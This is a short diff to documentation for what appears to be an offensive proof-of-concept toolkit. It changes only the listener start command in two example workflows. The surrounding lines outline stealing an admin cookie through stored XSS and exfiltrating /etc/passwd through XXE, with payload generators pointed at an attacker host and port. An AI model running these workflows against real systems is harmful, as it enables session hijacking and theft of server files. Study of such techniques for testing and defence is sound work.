@@ -20,7 +20,7 @@ Complete workflow for stealing cookies via XSS:
        """Steal admin cookie via stored XSS"""
 
        # 1. Start server (in separate terminal)
-       #    python -m poc.servers.server
+       #    uv run your_project --server
 
        # 2. Generate XSS payload
        payload = cookie_stealer(f"http://{lhost}:{lport}")
@@ -174,7 +174,7 @@ Read files via XXE:
        """Exfiltrate /etc/passwd via XXE"""
 
        # 1. Start server (in separate terminal)
-       #    python -m poc.servers.server
+       #    uv run your_project --server
 
        # 2. Generate XXE payload (also creates DTD file)
        payload = quick_test(f"http://{lhost}:{lport}", "/etc/passwd")
